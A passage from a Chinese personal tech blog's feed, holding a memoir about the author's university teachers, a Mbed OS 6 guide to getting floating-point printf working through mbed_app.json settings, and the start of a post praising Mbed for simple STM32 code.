的另一件事了。</p><h1 id="书记"><a href="#书记" class="headerlink" title="书记"></a>书记</h1><blockquote><p>我啊，哎，说出来也是个笑话，上学那会儿拿着全学院只有两个人拿的奖学金进了大学，最后第一学期高数就挂科了，绩点呵呵。其实，我觉得大学的这些课程，对我而言，没什么用处，我希望以后去做产品，我喜欢撸代码，讲道理，模电数电，自控，信号，我撸代码学他有什么用？哦，数电好像有用。。然后呢，专业分流了，人去年专业分流，物联网最低2.3，这咋整，我绩点才刚过2。</p></blockquote><p>上面这段是我从自己的QQ空间里面翻到的，确实是，高中四年的生活给我憋坏了，上了大学，我就想做自己想做的事，在这些事儿上努力，做出一些成绩。我们大学进去的时候是大类，需要在大二下半学期进行专业分流，这么多学生，咋分流，绩点呗！那我最感兴趣的事情就是物联网，也是猫着物联网工程专业才报的当时的学院，不然就去当时全校最顶尖的专业了，我的高考成绩是完全绰绰有余的。但，大学期间，实验室的撸代码生活翘了太多课了，我对于考前的突击也完全不当事儿，60分万岁，反正我拿过奖学金了，证明了我的应试能力了。那正常的专业分流，肯定没办法给我分到物联网工程了，咋办呢？</p><blockquote><p>我作死，去试着给胡院长发邮件，结果，人院长第二天一早就回我了！！这还真没想到啊！让我提交自己的简历和相关证明，参加专业分流特殊情况申请面试。我一直以为这些领导都很高冷的，感受到了人间温暖有木有！我就记得我的简历上，写满了大一干了那些生，什么51啊，32啊，openwrt啊，linux啊，路由器啊，拿了什么奖学金啊，当了班学长啊，什么创新实验项目啊，在协会担任职务啊什么什么的。怀着忐忑的心，我去参加了面试。</p></blockquote><blockquote><p>当时面试的有7，8个人吧，我最后一个进去，前面出来的人，脸色都不太好，我心一紧，这凉了啊！当我进了面试的地方（自动化学院的会议室），领导老师做了一排，我就呆呆的进去了，瞬间瞎尿了，有木有啊！有木有啊！！我真是抖着进去的。心中默念，“莫慌，莫慌！”，我开始了自我介绍，我吓得其实都有点逻辑混乱，急得跟文森特一样结巴了!!最让人暖心的是，书记，院长，老师们都微笑的看着我，不断的给我说，你别紧张，别慌，慢慢说。我自己的简述其实并不好，但是，书记和院长还是不断的引导我，我逐渐把自己这一年的经历，自己成绩下滑严重的原因阐述清楚，并表达了自己对物联网专业和物联网行业自己的一点看法。我记得书记听我说完后，没有什么犹豫，直接说：“嗯，这孩子还是对这个有些认识的，确实是自己在努力做着相关的事，前几个”，转过头看着胡院长，摇了摇头，然后转过来看着我：“你不是说你有梦想吗？那我们给你这个圆梦的机会！”那一刻，我人都傻了，幸福来的太突然。当然了，书记发表了看法，胡院长也要发表看法，胡院长很刁钻，问：“你说你马上要去参加robocup？”“嗯！5月29日出发，去日照比赛”“你有什么目标没？”“全国一等奖！”胡院长哈哈一笑，“那你还是要好好努力！”旁边的老师说：“其实二等奖就不错了！”胡院长转过头，认真到：“说是这么说，但是目标还是要定高嘛！”然后转过头看着我：“你加油，我们等你把一等奖拿回来，然后明年还可以去参加飞思卡尔”所有人笑笑，刚刚还十分紧张的面试，一下子轻松了好多。就业办的老师这时候也说：“你看，你基础那么好，入学的时候拿着“IT精英奖学金”，结果现在，成绩上还是要努力，你现在都对你未来职业的规划这么清楚，那等你毕业的时候，找工作还了得~2333333”。最后，书记说：“那就这样，你还是要多锻炼，太紧张了！”我说：“这个面试会改变我的一生啊！毕竟，我真的喜欢物联网！”这次面试，我其实是抖着进去，笑着出来的。这次面试我记一辈子，书记的肯定，我记一辈子！！</p></blockquote><p>我记得那天阳光很灼人，但其实心情在面试完了的那一刻豁然开朗。我顶着大太阳，跑去蜜雪冰城买了一杯喝的，惊魂未定地回到寝室，空气里弥漫着能继续追梦的味道，那是我大学最开心的几个小时。怎么讲呢，其实我觉得改变我人生轨迹的，就是那一次面试。那次面试如果没有通过，我可能被分到全学院最差且自己不喜欢的专业去，就不会有后来认识那么多有意思的老师，能涉足到那么多物联网相关技术的后续了。</p><p>我其实至今都不知道当时面试给我机会的老师叫什么，我就知道旁边人叫他书记，他也是坐在最中间的。但是真的很感谢他，当时的我正经历着低估，虽然嘴上说希望拿一等奖，但实际上，当时做机器人，遇到了很多的阻力，并且是当时无法解决的。那次面试，书记的话，真的给了自己很大的信心。可能多年后，他们都不会记得，曾经会有这么一次面试，有过这么一个学生。但是，这真的改变了我的人生，我真的到现在都很喜欢物联网技术，很庆幸有后两年吸取各种知识的经历，感谢那位书记。</p><h1 id="王教授"><a href="#王教授" class="headerlink" title="王教授"></a>王教授</h1><p>我说过，我觉得大学的课程，没有什么用，可能是受郭天祥的蛊惑吧。但是呢，王老师真的是我大学期间，见过的最崇敬的老师了。王老师的课是无线传感器网络，本来各种的路由算法相当的枯燥，但是王老师总是能用相当容易理解的比喻，让我们明白是怎么回事。比如MIMO啊，无线传感网的休眠机制啊等等。在那个时候，其他所有老师都在念PPT，你遇到这么一个在教学上如此出色的老师，并且他讲的是你感兴趣的领域，那真的可能是最幸福的一段时光了吧。</p><p>王老师一条腿好像不太灵活，我们也不太敢问，我就记得，王老师拖着一条腿和有些发福的身躯，在重庆夏天的讲台上讲课，每节课他头发都湿透了，现在记忆很深刻的，就是他拿一小块卫生纸擦汗的情形，这么一位教授，如此拼命的给本科生讲课，值得人尊敬。</p><p>当然了，我当时对于计算机网络，对于物联网技术是知之甚少的，我记得当时我有一个愿望，用手机发出一条命令，点亮一个LED灯。虽然现在看，我有100种方式实现，不过那时候，我连socket是什么都不知道。所以当我摸着石头过河，提出相当多疑问的时候，能够听懂我在问什么，然后直接回答我或者告诉我们你问的是什么，你应该查什么的老师，只有王老师了。我当然也尝试问过其他老师，其他老师也会很耐心的跟你解答，但真的，听不懂~</p><p>当然了，我也申请了本硕连读，导师就是王老师，我希望未来的硕士学习生涯，继续深入了解无线传感器网络，或是研究当时感兴趣的OpenWRT。不过呢，最终倒在了最后的面试上，我至今都觉得，大三那会儿，我是相当膨胀的，我觉得面试这种事情，经历过专业分流，还有人能质疑我？不过呢，真有老师能质疑你。</p><blockquote><p>研究生嘛，研究生就是发论文，发英文SCI的，你看你这英语4级都，哦，四级过了，那六级，对吧。</p></blockquote><p>我至今都记得那位面试我的老师，她眼中的不屑，我们当时做的比赛，是三届学生共同的努力，被她说的一文不值，我们当然可以选择难度低的项目，去取得更好的名次，但我们就是选择困难的项目，一届一届的传承下去，那大概是我从大学就养成的偏执吧。</p><h1 id="飞哥"><a href="#飞哥" class="headerlink" title="飞哥"></a>飞哥</h1><p>飞哥是我们的系主任，是个有些黑，身材有些圆的人。话说我们系几乎所有的老师都是教授了，身为系主任的他，却每年都错过教授的职称，感觉挺尴尬的吧。飞哥就是那种一本正经的学院派，当时讲计算机网络，是真滴听不懂，什么子网掩码，RIP协议之类的。为什么提飞哥呢？主要是当时本硕连读没了，整个人非常的低落，但是飞哥还是给了我挺多的鼓励的，比如当时确定毕设题目的时候，飞哥回我的邮件：</p><center><img src="https://pic.gaficat.com/default/飞哥的信.png" alt="飞哥的信" style="zoom: 50%;" /></center><p>我当时为了自己的毕设是投入了相当多的心血的，光是各种传感器的节点就花了2000多块，对于我而言，学生生涯可能很快就结束了，无忧无虑去专注于某种技术，不用担心自己生计的日子就到头了。所以很想集当时自己最大的技术实力，做一个系统出来，就是从天猫精灵的语音控制，到ZigBee的传感网，到蓝牙的传感网等等的一套异构网络智能家居解决方案，算是结束自己学生生涯的一个告别仪式吧。别人可能是拍毕业照，参加毕业典礼，我，可能就是这么一套设计吧。</p><h1 id="魏老师"><a href="#魏老师" class="headerlink" title="魏老师"></a>魏老师</h1><p>这个老师，是韩国回来的。我印象最深的，就是他说：“我跟你们讲，我当年，李敏镐是我校友！！！”当时全班女生那个尖叫~确实，他是从韩国留学回来的，方向是物联网安全。</p><p>这个老师，你任何时候见他，他都是笑眯眯的，总是给人一种笑面虎的感觉。当然不是说人家不好，只是个人的一种主观感受。他的方向是物联网安全，所以会涉及一些密码学上的东西，那当然也是听得云里雾里啊，什么AES，DES乱七八糟的，总之印象里，有一个学期，他的课都是在讲各种加密算法。</p><p>这谁知道呢，阴差阳错的，他的课我也没有好好听过，结果后来从事这方面工作了。</p><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>还是很庆幸，我的大学遇到了这么一群老师，我记得黄QQ当时上课说，你们的代课老师，都是全校最豪华的阵容了，啥？你们不信？你们啊！你看，你们的老师全部都是教授，当然有副教授，但很快也都是教授了。所以如果真的还有亲戚朋友问，你当时那个学校好不好？值不值得去？我会很坚定的告诉你，很值得！学风严，老师学术水平出色，没有架子，非常真诚，很关心学生，因材施教。城市好，美女多。这么好的地方，你为啥不去？</p><p>我想到，既然写了大学的老师，我是不是可以再水一篇文章，将自己大学期间的那些小伙伴们，比如抱了一大堆零食的志博；比如现在依然帮忙做硬件的杜哥(我打算之后回一趟学校，和当年那些小伙伴聚一聚，还有，想念8151的琴房，想去拍张照)。是不是还可以再水一篇文章，讲讲那些年我遇到的小姐姐们，也不知道他们现在怎么样了，不然周末约着去爬山，也不知道还有没有机会。你们期待嘛？期待的话给自己挖个坑。</p><p>前两天看Zealer的视频，关于众筹的，说国外的众筹平台，偏向于极客的风格，他们很重视参与感，你做的棒，你有你的故事，我就花钱支持你，没关系。我参与其中，帮你找BUG，改善产品。而中国的众筹，偏向于我花钱就要买一个好用实惠的产品。所以给了自己一个启示，也许，像我这样，专注于设计和创造产品的人，在中国根本没办法活下去，我们没有国外的创客文化，你得承认客观的差距。</p><p>怎么讲呢，感觉自己最近思维有一些混乱，因为遇到了一些事，这也是一直没有发文章的一个原因。不过很庆幸的是，从后台看到，每天都有一部分的访客，是直接访问我的网站的，没有从其他的推荐平台上引流过来，心里面真的很暖，谢谢你们的关注！无论是朋克风格TVOC传感器，还是我的网站（虽然没有开评论，但也看得到被人关注），真的谢谢你们，你们的关注和支持，让即使被大环境打击的有点泄气的我，依然有坚持下去的动力。我也许没有办法成为一名做产品的极客，然后靠自己的这个梦想活下去，但，加油吧！</p><p>7月我还有一些其他事，忙碌的一个月，网站肯定是没有时间更新文章啦，大家，理解万岁~七月期间也就不用反复刷我的网站啦，大家时间都很宝贵，提前还是告诉大家一声。七月底我会回来的，也积累了一些题目了，那些坑，继续往后填吧！</p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mbed OS 6踩坑手册——全新串口API</title>
    <link href="/posts/6b047738.html"/>
    <url>/posts/6b047738.html</url>
    
    <content type="html"><![CDATA[<h1 id="哪来的坑？"><a href="#哪来的坑？" class="headerlink" title="哪来的坑？"></a>哪来的坑？</h1><p>前两天，Mbed OS 6发布了，在一脸期待的打开IDE，看看有什么好玩的东西后，我惊奇地发现：之前所有的工程一片红，所有串口程序，都跑不通了，<code>printf</code>也不好使了，<code>%f</code>打印不出小数（浮点数）了。</p><h1 id="Mbed-OS-5串口程序"><a href="#Mbed-OS-5串口程序" class="headerlink" title="Mbed OS 5串口程序"></a>Mbed OS 5串口程序</h1><p>一个典型的Mbed OS 5的串口程序是这样的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;mbed.h&quot;</span></span><br><br><span class="hljs-function">Serial      <span class="hljs-title">pc</span><span class="hljs-params">(PA_9, PA_10)</span></span>; <span class="hljs-comment">// TX, RX</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;  <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>pc.<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;float test:%f\\r\\n&quot;</span>, <span class="hljs-number">0.5</span>);<br>thread_sleep_for(<span class="hljs-number">1000</span>);   <span class="hljs-comment">// wait 200 millisecond</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>参考文档：<a href="https://os.mbed.com/docs/mbed-os/v5.15/apis/serial.html">https://os.mbed.com/docs/mbed-os/v5.15/apis/serial.html</a></p></blockquote><p>Mbed OS 5中，<code>printf</code>是使用的标准库的，所以我们按照C语言正常的写法，是没有任何问题的。</p><h1 id="Mbed-OS-6-BufferedSerial-And-UnbufferedSerial"><a href="#Mbed-OS-6-BufferedSerial-And-UnbufferedSerial" class="headerlink" title="Mbed OS 6 BufferedSerial And UnbufferedSerial"></a>Mbed OS 6 BufferedSerial And UnbufferedSerial</h1><p>Mbed OS 6对串口部分的接口做了升级，分为<a href="%5B%5D()">BufferedSerial</a>和<a href="%5B%5D()">UnbufferedSerial</a>。</p><p><code>BufferedSerial</code>的性能要优于<code>UnbufferedSerial</code>并具有较少的CPU负载和较少的延迟问题。只有RAM不足且无法承受缓冲或需要更多控制串行端口并从IRQ使用它的应用程序才应使用<code>UnbufferedSerial</code>。</p><p>这里我就用<code>BufferedSerial</code>做相关的示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;mbed.h&quot;</span></span><br><br><span class="hljs-function">BufferedSerial      <span class="hljs-title">pc</span><span class="hljs-params">(PA_9, PA_10)</span></span>; <span class="hljs-comment">// TX, RX</span><br><br><span class="hljs-function">FileHandle *<span class="hljs-title">mbed::mbed_override_console</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> &amp;pc;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">while</span>(True)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%f\\r\\n&quot;</span>, <span class="hljs-number">0.1</span>);<br>thread_sleep_for(<span class="hljs-number">1000</span>);  <span class="hljs-comment">// wait 1000 millisecond</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们的第一反应是，Mbed OS 6的串口接口变得更加复杂了，需要通过C++代码，将<code>BufferedSerial</code>的实例<code>pc</code>传递给系统I/O的重定向，之后才能调用<code>printf</code>，将希望的内容通过串口打印到控制台。</p><p>但是其实你会发现，上面的代码，打印不出小数了，会出现下面的状况：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">f<br>f<br>f<br>f<br>f<br></code></pre></td></tr></table></figure><h2 id="无法用printf打印小数原因"><a href="#无法用printf打印小数原因" class="headerlink" title="无法用printf打印小数原因"></a>无法用<code>printf</code>打印小数原因</h2><p>这个问题让我很抓狂，因为google直接搜索，搜不到相关的解释。于是开始研究官方的说明文档，最终下面三篇文档解决了我的疑惑：</p><ul><li><a href="https://os.mbed.com/docs/mbed-os/v5.15/tutorials/optimizing.html#printf-and-reducing-memory">Mbed 内存优化</a></li><li><a href="https://github.com/ARMmbed/mbed-os/tree/master/platform/source/minimal-printf#size-comparison">Mbed minimal-print</a></li><li><a href="https://os.mbed.com/docs/mbed-os/v6.0/program-setup/advanced-configuration.html#configuration-parameters-in-mbed-app-json-mbed-lib-json">Mbed 配置系统</a></li></ul><h3 id="Mbed-OS-6开始默认使用minimal-printf"><a href="#Mbed-OS-6开始默认使用minimal-printf" class="headerlink" title="Mbed OS 6开始默认使用minimal-printf"></a>Mbed OS 6开始默认使用<code>minimal-printf</code></h3><p>首先，我无意间看到<a href="%5B%5D()">Mbed 内存优化</a>的文档中提及，如果我们的程序不需要64位整数或浮点打印希望优化flash，Mbed OS提供了<code>minimal-printf</code>库。之后，出于随缘的好奇心，我查阅了<a href="%5B%5D()">Mbed minimal-print</a>的文档。</p><p><code>minimal-printf</code>是Mbed为了减少flash的占用，提供的一个替代<code>printf</code>家族的库。它直接向串口/stdio输出而不使用<code>malloc</code>，所有的标志和精度修饰符都将被忽略。如果发生写入错误，没有对错误的处理。支持以下的格式化输出：</p><ul><li>%d: signed integer [h, hh, (none), l, ll, z, j, t].</li><li>%i: signed integer [h, hh, (none), l, ll, z, j, t].</li><li>%u: unsigned integer [h, hh, (none), l, ll, z, j, t].</li><li>%x: unsigned integer [h, hh, (none), l, ll, z, j, t], printed as hexadecimal number (e.g., ff).</li><li>%X: unsigned integer [h, hh, (none), l, ll, z, j, t], printed as hexadecimal number (e.g., FF).</li><li>%f: floating point (<strong>disabled by default</strong>).</li><li>%F: floating point (<strong>disabled by default</strong>, treated as %f).</li><li>%g: floating point (<strong>disabled by default</strong>, treated as %f).</li><li>%G: floating point (<strong>disabled by default</strong>, treated as %f).</li><li>%c: character.</li><li>%s: string.</li><li>%p: pointer (e.g. 0x00123456).</li></ul><p>注意上面的加粗，所有的浮点型数据默认都是禁用的。并且，Mbed OS 6为了尽可能减少对flash的占用，默认使用<code>minimal-printf</code>，</p><center><img src="https://pic.gaficat.com/default/Mbed6默认minimal-printf.png" alt="Mbed6默认minimal-printf" style="zoom: 50%;" /></center><h2 id="如何启用对浮点数输出的功能？"><a href="#如何启用对浮点数输出的功能？" class="headerlink" title="如何启用对浮点数输出的功能？"></a>如何启用对浮点数输出的功能？</h2><p><a href="%5B%5D()">Mbed minimal-print</a>的文档中提到了两种方法：</p><p>第一种配置<code>printf</code>家族的库为标准库。修改<code>mbed_app.json</code>文件中的应用程序配置，将<code>target.printf_lib</code>的值覆盖为<code>std</code>（即不使用<code>minimal-printf</code>，使用标准库），如下所示：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&quot;target_overrides&quot;: &#123;<br>        &quot;*&quot;: &#123;<br>            &quot;target.printf_lib&quot;: &quot;std&quot;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>第二种方法是，启用<code>minimal-printf</code>对浮点数输出的功能，修改<code>mbed_app.json</code>文件：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json">&quot;target_overrides&quot;: &#123;<br>        &quot;*&quot;: &#123;<br>            &quot;target.printf_lib&quot;: &quot;minimal-printf&quot;,<br>            &quot;platform.minimal-printf-enable-floating-point&quot;: true,<br>            &quot;platform.minimal-printf-set-floating-point-max-decimals&quot;: 6,<br>            &quot;platform.minimal-printf-enable-64-bit&quot;: false<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><ul><li>platform.minimal-printf-enable-floating-point：是否启用浮点数输出</li><li>platform.minimal-printf-set-floating-point-max-decimals：浮点数输出的精度</li><li>platform.minimal-printf-enable-64-bit：是否启用64位长整数型输出</li></ul><h2 id="配置文件在哪？"><a href="#配置文件在哪？" class="headerlink" title="配置文件在哪？"></a>配置文件在哪？</h2><p>我们知道了问题所在了，那就对配置文件做一些修改，但是，<code>mbed_app.json</code>这个配置文件在哪里？其实，<a href="%5B%5D()">Mbed 配置系统</a>的文档中有相关的说明：</p><p>我们可以在工程的根目录下，新建一个<code>mbed_app.json</code>文件，然后将上一小节所述的配置，写到<code>mbed_app.json</code>文件中，再次编译，bingo！</p><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>其实，这个坑，一度想让我去官方的论坛留言，但还是有一些运气成分吧，还是搞明白了怎么回事。</p><p>当然还有一些遗憾，比如：如果我有多个串口，怎么让每个串口都能用printf呢？我完全不懂c++，所以这个问题，搭建感兴趣吗？感兴趣的话，就当是给自己埋的一个坑吧！之后搞明白了再继续更新。</p>]]></content>
    
    
    <categories>
      
      <category>电子设计</category>
      
      <category>Mbed</category>
      
    </categories>
    
    
    <tags>
      
      <tag>电子设计</tag>
      
      <tag>Mbed</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mbed——我心中完美物联网OS</title>
    <link href="/posts/ee759d6d.html"/>
    <url>/posts/ee759d6d.html</url>
    
    <content type="html"><![CDATA[<h1 id="我是怎么知道Mbed的？"><a href="#我是怎么知道Mbed的？" class="headerlink" title="我是怎么知道Mbed的？"></a>我是怎么知道Mbed的？</h1><p>我希望用舵机做一个开灯神器（就是喊一声“天猫精灵，开灯！”，贴在传统墙壁开关上的舵机就转一下，开灯）很久了，大家感兴趣嘛？感兴趣我这里给自己挖一个坑，后续专门写一篇文章，讲具体的辛酸历程。</p><p>总之呢，折腾的过程中，我很好奇，我的Mac电脑，应该如何把arduino的固件烧录到我的STM32F103C8T6中？在查询资料的过程中，我看到了一个视频，视频中老外为了尽快生成一个固件，使用<strong>Mbed</strong>在线的编辑工具，在线编译了一个固件出来。这波操作给我惊呆了，印象中，想要用STM32点亮一盏LED灯，代码量还是比较多的，你要开各种总线时钟，你要对引脚做各种配置。但老外只用了几行代码，就类似于下面几行代码就完事儿，这？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">DigitalOut <span class="hljs-title">led1</span><span class="hljs-params">(PB_5)</span></span>;led1=<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><h1 id="何为Mbed-OS"><a href="#何为Mbed-OS" class="headerlink" title="何为Mbed OS"></a>何为Mbed OS</h1><p>Mbed是ARM亲自操刀（傻了吧？芯片架构是人家设计的，人家再来亲自操刀OS，那肯定是专业团队~）的一款物联网OS，针对的芯片是Arm Cortex系列的，其设计的full profile（我也不知道该怎么翻译）是RTOS，提供了一个抽象层，以便开发人员可以编写在任何启用了Mbed的板上运行的C / C ++应用程序。</p><p>说人话，啥意思？按照传统，我们在STM32上写一个程序是什么过程？首先是在<strong>windows</strong>上，装<strong>keil</strong>或者<strong>iar</strong>，然后看着ST的数据手册，即使用库开发，依然需要配置大量的时钟、总线等等（有人说STM32Cube，你看下一句话）。这个时候，如果跟你说，换个公司的芯片，你给我换Ti的Cortex-M3，你是不是就要骂娘了？</p><p>类似于Arduino，Mbed是一个针对Arm Cortex系列芯片的框架，作为开发者的我们，使用Mbed，可以获得以下好处：</p><ul><li>优秀的多平台开发环境，Mac上终于可以写STM32的程序啦！Mbed有配套的本地开发IDE、CLI工具，支持Windows、Mac以及linux。同时也提供在线的编辑、编译环境。也支持将Mbed的工程导出，导成VS Code，Keil，IAR的工程都可以。</li><li>极少的代码量，一行代码初始化IO口、串口等外设，再也无需关注复杂的数据手册、钻研库开发啦！硬件层均由OS完成，各种复杂的驱动？专业团队，高兴送走！</li><li>OS提供丰富的API，多线程、信号量等等，我们只需要关注最上层的业务逻辑。</li><li>再也不用为换芯片型号、厂商担心啦（我曾经参加一个3天时间的比赛，后来两天时间都在学TI TIVA系列芯片，移植点亮一盏LED）！使用Mbed,一套逻辑代码，ST的芯片好使，NXP的芯片好使，TI的芯片也好使。</li></ul><h2 id="优秀的多平台开发环境"><a href="#优秀的多平台开发环境" class="headerlink" title="优秀的多平台开发环境"></a>优秀的多平台开发环境</h2><p>多平台开发环境，意味着我们可以在Windows，MacOS，Linux甚至树莓派上做嵌入式的开发。</p><p>我在工作之前，一直使用windows系统，windows是一个非常好的操作系统（主要是打游戏舒服）。但是不能否认的是，存在相当一部分人，使用苹果电脑。你当然可以说那我装个虚拟机或者MacBook装个双系统就好了呀？但就像我这样的人，就觉得我花了大价钱，买了苹果的设备了，我还返回去用Windows，我这不是吃饱了没事干吗？</p><blockquote><p>其实，工作以后，我购入最满意的东西，就是我的MacBook，它足够的轻，续航足够长，屏幕素质优秀（屏幕好真的，用过才知道）。晚上回家或是上班，随手掏出来，记笔记，改代码，写博客，真的有欲望做这些事。再也不用望着几斤重的游戏本，呼哧呼哧，连打开的欲望都没有了。</p></blockquote><p>但是，购入MacBook后，我就再没有碰过STM32了，因为没有Keil这样的IDE，传统观念里面，在Mac上玩单片机相当的麻烦（有人用VS Code搭建过开发环境嘛？）。Mbed就解决了这个问题，用它的在线编辑器和编译环境，你只需要一个浏览器，就能玩转单片机了。</p><center><img src="https://pic.gaficat.com/default/Mbed%E5%9C%A8%E7%BA%BF%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83.png" alt="Mbed在线开发环境" style="zoom: 25%;" /></center><p>当然了，可支持导出到我们熟悉的IDE。</p><center><img src="https://pic.gaficat.com/default/%E5%B7%A5%E7%A8%8B%E5%8F%AF%E5%AF%BC%E5%87%BA.png" alt="工程可导出" style="zoom:50%;" /></center><h2 id="极少的代码量"><a href="#极少的代码量" class="headerlink" title="极少的代码量"></a>极少的代码量</h2><p>Mbed的代码量能少到什么程度呢？我们以点亮一盏LED为例，STM32库开发，代码是这样的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;led.h&quot;</span>  </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;SysTick.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">LED_GPIO_Config</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">/*定义一个GPIO_InitTypeDef类型的结构体*/</span><br>GPIO_InitTypeDef GPIO_InitStructure;<br><br><span class="hljs-comment">/*开启GPIOB和GPIOE的外设时钟*/</span><br>RCC_APB2PeriphClockCmd( RCC_APB2Periph_GPIOC|RCC_APB2Periph_GPIOB, ENABLE); <br><br><span class="hljs-comment">/*选择要控制的GPIOB引脚*/</span>   <br>GPIO_InitStructure.GPIO_Pin = GPIO_Pin_0|GPIO_Pin_1|GPIO_Pin_2;<br><br><span class="hljs-comment">/*设置引脚模式为通用推挽输出*/</span><br>GPIO_InitStructure.GPIO_Mode = GPIO_Mode_Out_PP;   <br><br><span class="hljs-comment">/*设置引脚速率为50MHz */</span>   <br>GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz; <br><br><span class="hljs-comment">/*调用库函数，初始化GPIOB0*/</span><br>GPIO_Init(GPIOC, &amp;GPIO_InitStructure);<br><br>GPIO_InitStructure.GPIO_Pin = GPIO_Pin_0;<br><br>GPIO_Init(GPIOB, &amp;GPIO_InitStructure);<br><br><span class="hljs-comment">/* 关闭所有led灯*/</span><br>GPIO_ResetBits(GPIOC, GPIO_Pin_0|GPIO_Pin_1|GPIO_Pin_2);<br>GPIO_ResetBits(GPIOB, GPIO_Pin_0);<br><br>Delay_ms(<span class="hljs-number">1000</span>);<br><br>GPIO_SetBits(GPIOC, GPIO_Pin_0|GPIO_Pin_1|GPIO_Pin_2);<br>GPIO_SetBits(GPIOB, GPIO_Pin_0);<br>Delay_ms(<span class="hljs-number">1000</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>Mbed的代码长这样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;mbed.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">LED_GPIO_Config</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function">DigitalOut  <span class="hljs-title">led1</span><span class="hljs-params">(PB_6)</span></span>;   <span class="hljs-comment">// on-board LED</span><br><br>led1 = <span class="hljs-number">1</span>;<br>thread_sleep_for(<span class="hljs-number">200</span>);   <span class="hljs-comment">// wait 200 millisecond</span><br>led1 = <span 